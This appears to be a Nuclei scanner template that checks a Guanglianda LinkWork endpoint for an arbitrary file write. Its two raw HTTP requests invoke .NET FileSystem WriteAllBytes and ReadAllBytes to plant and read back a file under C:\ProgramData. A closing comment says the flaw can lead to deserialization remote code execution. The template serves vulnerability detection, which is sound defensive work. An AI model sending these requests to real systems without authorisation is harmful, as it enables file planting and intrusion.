id: guanglianda-linkwork-fileupload

info:
  name: guanglianda-linkwork-fileupload
  author: guanglianda-linkwork-fileupload
  severity: high

variables:
  filename: "{{to_lower(rand_base(10))}}"

http:
  - raw:
      - | #upload
        POST /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&assembly&action=WriteAllBytes HTTP/1.1
        Accept:*/*
        Accept-Encoding:gzip, deflate, br
        Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
        Connection:close
        Content-Type:application/json
        User-Agent:Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36

        ["\"C:\\\\ProgramData\\\\{{filename}}.txt\"","[115,113,108]","false"]

      - | #read
        POST /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&assembly&action=ReadAllBytes HTTP/1.1
        Accept:*/*
        Accept-Encoding:gzip, deflate, br
        Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
        Connection:close
        Content-Type:application/json
        User-Agent:Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36

        ["\"C:\\\\ProgramData\\\\{{filename}}.txt\""]

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"115,113,108")
#可以反序列化rce